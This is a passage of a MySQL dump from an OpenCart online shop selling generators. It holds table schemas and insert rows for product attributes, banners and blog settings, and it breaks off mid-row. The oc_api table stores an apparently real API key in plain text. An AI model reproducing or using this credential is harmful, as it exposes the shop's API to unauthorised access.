DROP TABLE IF EXISTS `oc_weight_class`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_weight_class` (
  `weight_class_id` int(11) NOT NULL AUTO_INCREMENT,
  `value` decimal(15,8) NOT NULL DEFAULT '0.00000000',
  PRIMARY KEY (`weight_class_id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_weight_class_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_weight_class_description` (
  `weight_class_id` int(11) NOT NULL AUTO_INCREMENT,
  `language_id` int(11) NOT NULL,
  `title` varchar(32) NOT NULL,
  `unit` varchar(4) NOT NULL,
  PRIMARY KEY (`weight_class_id`,`language_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_zone`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_zone` (
  `zone_id` int(11) NOT NULL AUTO_INCREMENT,
  `country_id` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  `code` varchar(32) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`zone_id`)
) ENGINE=MyISAM AUTO_INCREMENT=169 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_zone_to_geo_zone`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_zone_to_geo_zone` (
  `zone_to_geo_zone_id` int(11) NOT NULL AUTO_INCREMENT,
  `country_id` int(11) NOT NULL,
  `zone_id` int(11) NOT NULL DEFAULT '0',
  `geo_zone_id` int(11) NOT NULL,
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`zone_to_geo_zone_id`)
) ENGINE=MyISAM AUTO_INCREMENT=111 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

LOCK TABLES `oc_address` WRITE;
/*!40000 ALTER TABLE `oc_address` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_address` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_affiliate` WRITE;
/*!40000 ALTER TABLE `oc_affiliate` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_affiliate` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_affiliate_activity` WRITE;
/*!40000 ALTER TABLE `oc_affiliate_activity` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_affiliate_activity` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_affiliate_login` WRITE;
/*!40000 ALTER TABLE `oc_affiliate_login` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_affiliate_login` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_affiliate_transaction` WRITE;
/*!40000 ALTER TABLE `oc_affiliate_transaction` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_affiliate_transaction` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_agoo_signer` WRITE;
/*!40000 ALTER TABLE `oc_agoo_signer` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_agoo_signer` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_api` WRITE;
/*!40000 ALTER TABLE `oc_api` DISABLE KEYS */;
INSERT INTO `oc_api` VALUES (1,'dPpP6RcBKibB2ZEUSrUiIvpwlbEmbEAI0fb7iF0JvpLTNj5hHoCbLQ9FnOvGM5xh','','','GJFBCRGnOJx8ZGoIx9mrGJLwhZT70IcTNKmdY0OfjBSBeBPGWrFV3YPzU7tLWtAdNjBSmxPuxPobbStbxwZVjBMQ83CwusZ9FURetGHX213OQ7EJGOmtHBBEfLNvADr30dbEsx2X00BY89SOSEsehZsQ41RHJw1Kc9cBj1ftrNA6iZZrWQpnzJRyM4M0K24z73WVTSBeZ721ALXhS0fIARtuVUA7DVy0VJHC4HZlAEmJUVOvGyNBDxCDXIqazMlP',1,'2016-02-26 15:41:47','2016-02-26 15:41:47');
/*!40000 ALTER TABLE `oc_api` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_attribute` WRITE;
/*!40000 ALTER TABLE `oc_attribute` DISABLE KEYS */;
INSERT INTO `oc_attribute` VALUES (1,6,1),(2,6,5),(3,6,3),(12,7,0),(13,7,1),(14,7,2),(15,7,2),(16,7,0),(17,7,3),(18,7,5),(19,7,6),(20,8,4),(21,8,12),(22,7,0),(23,8,1),(24,8,2),(25,8,3),(26,7,0),(27,7,0),(28,7,1),(29,8,6),(30,8,7),(31,8,5),(32,8,8),(33,8,9),(34,8,10),(35,8,11),(36,8,13),(37,8,14),(38,8,15),(39,9,0),(40,9,0),(41,9,0),(43,7,2),(44,9,0),(45,10,0),(46,10,0),(47,10,0),(48,10,0),(49,10,0);
/*!40000 ALTER TABLE `oc_attribute` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_attribute_description` WRITE;
/*!40000 ALTER TABLE `oc_attribute_description` DISABLE KEYS */;
INSERT INTO `oc_attribute_description` VALUES (1,1,'Description'),(2,1,'No. of Cores'),(29,4,'Частота тока'),(20,4,'Ток А'),(36,3,'Длина (мм)'),(21,1,'Расход топлива при 100% нагрузке (кг/ч)'),(31,4,'Cos φ'),(3,1,'Clockspeed'),(23,4,'Двигатель'),(25,4,'Генератор'),(43,4,'Сила тока (А)'),(2,4,'No. of Cores'),(1,4,'Description'),(1,3,'Description'),(2,3,'No. of Cores'),(30,4,'Кол-во фаз'),(36,1,'Длина (мм)'),(31,3,'Cos φ'),(3,3,'Clockspeed'),(3,4,'Clockspeed'),(12,1,'Номинальная мощность квт'),(12,3,'Nominal power kwt'),(12,4,'Номінальна потужність квт'),(13,3,'Номинальная мощность ква'),(13,1,'Номинальная мощность ква'),(14,1,'Производитель'),(14,3,'Manufacturer'),(14,4,'Виробник'),(15,1,'Резервная мощность квт'),(15,3,'Reserve power kwt'),(15,4,'Резервна потужність квт'),(16,4,'Резервна потужність ква'),(16,3,'Reserve power kwa'),(16,1,'Резервная мощность ква'),(17,1,'КПД'),(17,3,'KPD'),(17,4,'ККД'),(18,1,'Вес '),(18,3,'Weight'),(18,4,'Вага'),(19,1,'Применяемость'),(19,3,'Applicability'),(19,4,'Застосовність'),(20,1,'Ток А'),(20,3,'Ток А'),(13,4,'Номинальная мощность ква'),(21,3,'Расход топлива при 100% нагрузке (кг/ч)'),(22,1,'Возможность установки'),(22,3,'Возможность установки'),(22,4,'Возможность установки'),(23,1,'Двигатель'),(23,3,'Двигатель'),(24,4,'Марка двигателя'),(24,3,'Марка двигателя'),(25,1,'Генератор'),(25,3,'Генератор'),(26,1,'Мощность'),(26,3,'Мощность'),(26,4,'Мощность'),(27,1,'Применяемость'),(27,3,'Применяемость'),(27,4,'Применяемость'),(28,1,'Вес (кг)'),(28,3,'Вес (кг)'),(24,1,'Марка двигателя'),(29,1,'Частота тока'),(29,3,'Частота тока'),(30,1,'Кол-во фаз'),(30,3,'Кол-во фаз'),(31,1,'Cos φ'),(32,1,'Напряжение генератора'),(32,3,'Напряжение генератора'),(32,4,'Напряжение генератора'),(33,1,'Рабочая частота вращения двигателя (об/мин)'),(33,3,'Рабочая частота вращения двигателя (об/мин)'),(33,4,'Рабочая частота вращения двигателя (об/мин)'),(34,1,'Расход топлива при 50% нагрузке (кг/ч)'),(34,3,'Расход топлива при 50% нагрузке (кг/ч)'),(34,4,'Расход топлива при 50% нагрузке (кг/ч)'),(35,1,'Расход топлива при 75% нагрузке (кг/ч)'),(35,3,'Расход топлива при 75% нагрузке (кг/ч)'),(35,4,'Расход топлива при 75% нагрузке (кг/ч)'),(36,4,'Длина (мм)'),(37,1,'Ширина (мм)'),(37,3,'Ширина (мм)'),(38,4,'Высота (мм)'),(38,3,'Высота (мм)'),(39,1,'Контроллер автоматического управления в базовой комплектации'),(39,3,'Контроллер автоматического управления в базовой комплектации'),(39,4,'Контроллер автоматического управления в базовой комплектации'),(40,1,'Возможность установки АВР'),(40,3,'Возможность установки АВР'),(40,4,'Возможность установки АВР'),(41,1,'Стартерные АКБ в базовой комплектации'),(41,3,'Стартерные АКБ в базовой комплектации'),(41,4,'Стартерные АКБ в базовой комплектации'),(21,4,'Расход топлива при 100% нагрузке (кг/ч)'),(43,1,'Сила тока (А)'),(43,3,'Сила тока (А)'),(44,1,'1111'),(44,3,'1111'),(44,4,'1111'),(28,4,'Вес (кг)'),(45,4,'Первая гарантия'),(45,3,'Первая гарантия'),(45,1,'Первая гарантия'),(46,1,'Вторая гарантия'),(46,3,'Вторая гарантия'),(46,4,'Вторая гарантия'),(47,1,'Третья гарантия'),(47,3,'Третья гарантия'),(47,4,'Третья гарантия'),(48,1,'Четвертая гарантия'),(48,3,'Четвертая гарантия'),(48,4,'Четвертая гарантия'),(49,1,'Пятая гарантия'),(49,3,'Пятая гарантия'),(49,4,'Пятая гарантия'),(38,1,'Высота (мм)'),(37,4,'Ширина (мм)');
/*!40000 ALTER TABLE `oc_attribute_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_attribute_group` WRITE;
/*!40000 ALTER TABLE `oc_attribute_group` DISABLE KEYS */;
INSERT INTO `oc_attribute_group` VALUES (3,2),(4,1),(5,3),(6,4),(7,1),(8,2),(9,3),(10,0);
/*!40000 ALTER TABLE `oc_attribute_group` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_attribute_group_description` WRITE;
/*!40000 ALTER TABLE `oc_attribute_group_description` DISABLE KEYS */;
INSERT INTO `oc_attribute_group_description` VALUES (3,1,'Memory'),(4,1,'Technical'),(5,1,'Motherboard'),(6,1,'Processor'),(6,4,'Processor'),(5,4,'Motherboard'),(4,4,'Technical'),(3,4,'Memory'),(3,3,'Memory'),(4,3,'Technical'),(5,3,'Motherboard'),(6,3,'Processor'),(7,3,'Main '),(7,1,'Основные характеристики'),(8,4,'Характеристики'),(8,3,'Характеристики'),(8,1,'Характеристики'),(7,4,'Головні характеристики'),(9,1,'Дополнительное оборудование'),(9,3,'Дополнительное оборудование'),(9,4,'Дополнительное оборудование'),(10,1,'Гарантии'),(10,3,'Гарантии'),(10,4,'Гарантии');
/*!40000 ALTER TABLE `oc_attribute_group_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_banner` WRITE;
/*!40000 ALTER TABLE `oc_banner` DISABLE KEYS */;
INSERT INTO `oc_banner` VALUES (6,'HP Products',1),(7,'Home Page Slideshow',1),(8,'Manufacturers',1);
/*!40000 ALTER TABLE `oc_banner` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_banner_image` WRITE;
/*!40000 ALTER TABLE `oc_banner_image` DISABLE KEYS */;
INSERT INTO `oc_banner_image` VALUES (155,7,'','catalog/demo/banners/MacBookAir.jpg',0),(156,7,'index.php?route=product/product&amp;path=57&amp;product_id=49','catalog/demo/banners/iPhone6.jpg',0),(87,6,'index.php?route=product/manufacturer/info&amp;manufacturer_id=7','catalog/demo/compaq_presario.jpg',0),(94,8,'','catalog/demo/manufacturer/nfl.png',0),(95,8,'','catalog/demo/manufacturer/redbull.png',0),(96,8,'','catalog/demo/manufacturer/sony.png',0),(91,8,'','catalog/demo/manufacturer/cocacola.png',0),(92,8,'','catalog/demo/manufacturer/burgerking.png',0),(93,8,'','catalog/demo/manufacturer/canon.png',0),(88,8,'','catalog/demo/manufacturer/harley.png',0),(89,8,'','catalog/demo/manufacturer/dell.png',0),(90,8,'','catalog/demo/manufacturer/disney.png',0),(97,8,'','catalog/demo/manufacturer/starbucks.png',0),(98,8,'','catalog/demo/manufacturer/nintendo.png',0);
/*!40000 ALTER TABLE `oc_banner_image` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_banner_image_description` WRITE;
/*!40000 ALTER TABLE `oc_banner_image_description` DISABLE KEYS */;
INSERT INTO `oc_banner_image_description` VALUES (87,1,6,'HP Banner',''),(93,1,8,'Canon',''),(92,1,8,'Burger King',''),(91,1,8,'Coca Cola',''),(90,1,8,'Disney',''),(89,1,8,'Dell',''),(88,1,8,'Harley Davidson',''),(94,1,8,'NFL',''),(95,1,8,'RedBull',''),(96,1,8,'Sony',''),(97,1,8,'Starbucks',''),(98,1,8,'Nintendo',''),(95,4,8,'RedBull',''),(94,4,8,'NFL',''),(88,4,8,'Harley Davidson',''),(89,4,8,'Dell',''),(90,4,8,'Disney',''),(91,4,8,'Coca Cola',''),(92,4,8,'Burger King',''),(93,4,8,'Canon',''),(87,4,6,'HP Banner',''),(87,3,6,'HP Banner',''),(93,3,8,'Canon',''),(92,3,8,'Burger King',''),(91,3,8,'Coca Cola',''),(90,3,8,'Disney',''),(89,3,8,'Dell',''),(88,3,8,'Harley Davidson',''),(94,3,8,'NFL',''),(95,3,8,'RedBull',''),(96,3,8,'Sony',''),(97,3,8,'Starbucks',''),(98,3,8,'Nintendo',''),(96,4,8,'Sony',''),(97,4,8,'Starbucks',''),(98,4,8,'Nintendo','dsa'),(155,1,7,'','Башенка выкатила крутой ивент на 1 марта http://vk.cc/4QDNRD. Да-да, это презентация проекта колонизации Марса &quot;Mars One&quot; в КПИ.\r\n\r\nЕщё было пару мемасиков в ленте, но это уже совсем другая история.\r\nСуббота как суббота — все отдыхали и в интернетиках не висели.\r\n\r\nВоскресенье.\r\n\r\nМожно собрать и зарегистрировать команду на игру &quot;Что? Где? Когда?&quot; http://vk.cc/4QDPps. Уважаемые знатоки, время показать кто тут самый крутой.\r\n\r\nПодкатила новая крутая видяшка нашего Хогвартса с высоты птичьего полёта http://vk.cc/4QDRbZ. \r\n\r\nНу и самое важное!\r\nhttps://vk.com/kpidata — пройдите опрос о своём факультете. Оцени преподавателя, как он когда-то оценивал тебя. \r\n\r\nВот и сказочке конец, прочитал — ну молодец!\r\nКто ложится спать — доброй ночи, а кто будет смотреть Оскар — победы Лео.'),(155,3,7,'',''),(155,4,7,'',''),(156,1,7,'',''),(156,3,7,'',''),(156,4,7,'','');
/*!40000 ALTER TABLE `oc_banner_image_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_blog` WRITE;
/*!40000 ALTER TABLE `oc_blog` DISABLE KEYS */;
INSERT INTO `oc_blog` VALUES (1,'','a:42:{s:10:\"blog_small\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:8:\"blog_big\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:16:\"blog_subcategory\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:11:\"thumb_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"product_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"gallery_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:10:\"thumb_view\";s:1:\"0\";s:11:\"images_view\";s:1:\"0\";s:16:\"blog_num_records\";s:0:\"\";s:12:\"records_more\";s:1:\"0\";s:17:\"blog_num_comments\";s:0:\"\";s:13:\"blog_num_desc\";s:0:\"\";s:19:\"blog_num_desc_words\";s:0:\"\";s:18:\"blog_num_desc_pred\";s:0:\"\";s:13:\"blog_template\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:20:\"blog_template_record\";s:0:\"\";s:21:\"blog_template_comment\";s:0:\"\";s:5:\"order\";s:6:\"latest\";s:8:\"order_ad\";s:4:\"desc\";s:12:\"status_order\";s:1:\"0\";s:17:\"status_pagination\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:13:\"author_status\";s:1:\"0\";s:20:\"author_record_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"1\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"1\";s:11:\"view_rating\";s:1:\"1\";s:8:\"view_rss\";s:1:\"0\";s:12:\"view_captcha\";s:1:\"1\";s:13:\"visual_editor\";s:1:\"1\";s:7:\"bbwidth\";s:0:\"\";s:16:\"end_url_category\";s:0:\"\";s:12:\"blog_devider\";s:1:\"1\";s:15:\"blog_short_path\";s:1:\"0\";s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:8:\"reserved\";s:0:\"\";s:16:\"description_full\";s:1:\"0\";}',0,0,0,1,1,1,'2016-02-28 15:55:10','2016-02-28 15:55:10'),(6,'','a:42:{s:10:\"blog_small\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:8:\"blog_big\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:16:\"blog_subcategory\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:11:\"thumb_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"product_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"gallery_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:10:\"thumb_view\";s:1:\"0\";s:11:\"images_view\";s:1:\"0\";s:16:\"blog_num_records\";s:0:\"\";s:12:\"records_more\";s:1:\"0\";s:17:\"blog_num_comments\";s:0:\"\";s:13:\"blog_num_desc\";s:0:\"\";s:19:\"blog_num_desc_words\";s:0:\"\";s:18:\"blog_num_desc_pred\";s:0:\"\";s:13:\"blog_template\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:20:\"blog_template_record\";s:0:\"\";s:21:\"blog_template_comment\";s:0:\"\";s:5:\"order\";s:6:\"latest\";s:8:\"order_ad\";s:4:\"desc\";s:12:\"status_order\";s:1:\"0\";s:17:\"status_pagination\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:13:\"author_status\";s:1:\"0\";s:20:\"author_record_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"1\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"1\";s:11:\"view_rating\";s:1:\"1\";s:8:\"view_rss\";s:1:\"0\";s:12:\"view_captcha\";s:1:\"1\";s:13:\"visual_editor\";s:1:\"1\";s:7:\"bbwidth\";s:0:\"\";s:16:\"end_url_category\";s:0:\"\";s:12:\"blog_devider\";s:1:\"1\";s:15:\"blog_short_path\";s:1:\"0\";s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:8:\"reserved\";s:0:\"\";s:16:\"description_full\";s:1:\"0\";}',0,0,0,5,1,1,'2016-02-28 18:38:10','2016-03-12 17:32:52'),(4,'','a:42:{s:10:\"blog_small\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:8:\"blog_big\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:16:\"blog_subcategory\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:11:\"thumb_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"product_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"gallery_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:10:\"thumb_view\";s:1:\"0\";s:11:\"images_view\";s:1:\"0\";s:16:\"blog_num_records\";s:0:\"\";s:12:\"records_more\";s:1:\"0\";s:17:\"blog_num_comments\";s:0:\"\";s:13:\"blog_num_desc\";s:0:\"\";s:19:\"blog_num_desc_words\";s:0:\"\";s:18:\"blog_num_desc_pred\";s:0:\"\";s:13:\"blog_template\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:20:\"blog_template_record\";s:0:\"\";s:21:\"blog_template_comment\";s:0:\"\";s:5:\"order\";s:6:\"latest\";s:8:\"order_ad\";s:4:\"desc\";s:12:\"status_order\";s:1:\"0\";s:17:\"status_pagination\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:13:\"author_status\";s:1:\"0\";s:20:\"author_record_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"1\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"1\";s:11:\"view_rating\";s:1:\"1\";s:8:\"view_rss\";s:1:\"0\";s:12:\"view_captcha\";s:1:\"1\";s:13:\"visual_editor\";s:1:\"1\";s:7:\"bbwidth\";s:0:\"\";s:16:\"end_url_category\";s:0:\"\";s:12:\"blog_devider\";s:1:\"1\";s:15:\"blog_short_path\";s:1:\"0\";s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:8:\"reserved\";s:0:\"\";s:16:\"description_full\";s:1:\"0\";}',0,0,0,3,1,1,'2016-02-28 17:55:11','2016-02-28 17:55:11'),(5,'','a:42:{s:10:\"blog_small\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:8:\"blog_big\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:16:\"blog_subcategory\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:11:\"thumb_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"product_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"gallery_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:10:\"thumb_view\";s:1:\"0\";s:11:\"images_view\";s:1:\"0\";s:16:\"blog_num_records\";s:0:\"\";s:12:\"records_more\";s:1:\"0\";s:17:\"blog_num_comments\";s:0:\"\";s:13:\"blog_num_desc\";s:0:\"\";s:19:\"blog_num_desc_words\";s:0:\"\";s:18:\"blog_num_desc_pred\";s:0:\"\";s:13:\"blog_template\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:20:\"blog_template_record\";s:0:\"\";s:21:\"blog_template_comment\";s:0:\"\";s:5:\"order\";s:6:\"latest\";s:8:\"order_ad\";s:4:\"desc\";s:12:\"status_order\";s:1:\"0\";s:17:\"status_pagination\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:13:\"author_status\";s:1:\"0\";s:20:\"author_record_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"1\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"1\";s:11:\"view_rating\";s:1:\"1\";s:8:\"view_rss\";s:1:\"0\";s:12:\"view_captcha\";s:1:\"1\";s:13:\"visual_editor\";s:1:\"1\";s:7:\"bbwidth\";s:0:\"\";s:16:\"end_url_category\";s:0:\"\";s:12:\"blog_devider\";s:1:\"1\";s:15:\"blog_short_path\";s:1:\"0\";s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:8:\"reserved\";s:0:\"\";s:16:\"description_full\";s:1:\"0\";}',0,0,0,4,1,1,'2016-02-28 17:55:52','2016-02-29 14:03:10'),(8,'','a:42:{s:10:\"blog_small\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:8:\"blog_big\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:16:\"blog_subcategory\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:11:\"thumb_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"product_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"gallery_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:10:\"thumb_view\";s:1:\"0\";s:11:\"images_view\";s:1:\"0\";s:16:\"blog_num_records\";s:0:\"\";s:12:\"records_more\";s:1:\"0\";s:17:\"blog_num_comments\";s:0:\"\";s:13:\"blog_num_desc\";s:0:\"\";s:19:\"blog_num_desc_words\";s:0:\"\";s:18:\"blog_num_desc_pred\";s:0:\"\";s:13:\"blog_template\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:20:\"blog_template_record\";s:0:\"\";s:21:\"blog_template_comment\";s:0:\"\";s:5:\"order\";s:6:\"latest\";s:8:\"order_ad\";s:4:\"desc\";s:12:\"status_order\";s:1:\"0\";s:17:\"status_pagination\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:13:\"author_status\";s:1:\"0\";s:20:\"author_record_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"1\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"1\";s:11:\"view_rating\";s:1:\"1\";s:8:\"view_rss\";s:1:\"0\";s:12:\"view_captcha\";s:1:\"1\";s:13:\"visual_editor\";s:1:\"1\";s:7:\"bbwidth\";s:0:\"\";s:16:\"end_url_category\";s:0:\"\";s:12:\"blog_devider\";s:1:\"1\";s:15:\"blog_short_path\";s:1:\"0\";s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:8:\"reserved\";s:0:\"\";s:16:\"description_full\";s:1:\"0\";}',0,0,0,6,1,1,'2016-03-12 15:14:13','2016-03-12 17:29:56'),(9,'','a:42:{s:10:\"blog_small\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:8:\"blog_big\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:16:\"blog_subcategory\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:11:\"thumb_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"product_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"gallery_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:10:\"thumb_view\";s:1:\"0\";s:11:\"images_view\";s:1:\"0\";s:16:\"blog_num_records\";s:0:\"\";s:12:\"records_more\";s:1:\"0\";s:17:\"blog_num_comments\";s:0:\"\";s:13:\"blog_num_desc\";s:0:\"\";s:19:\"blog_num_desc_words\";s:0:\"\";s:18:\"blog_num_desc_pred\";s:0:\"\";s:13:\"blog_template\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:20:\"blog_template_record\";s:0:\"\";s:21:\"blog_template_comment\";s:0:\"\";s:5:\"order\";s:6:\"latest\";s:8:\"order_ad\";s:4:\"desc\";s:12:\"status_order\";s:1:\"0\";s:17:\"status_pagination\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:13:\"author_status\";s:1:\"0\";s:20:\"author_record_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s: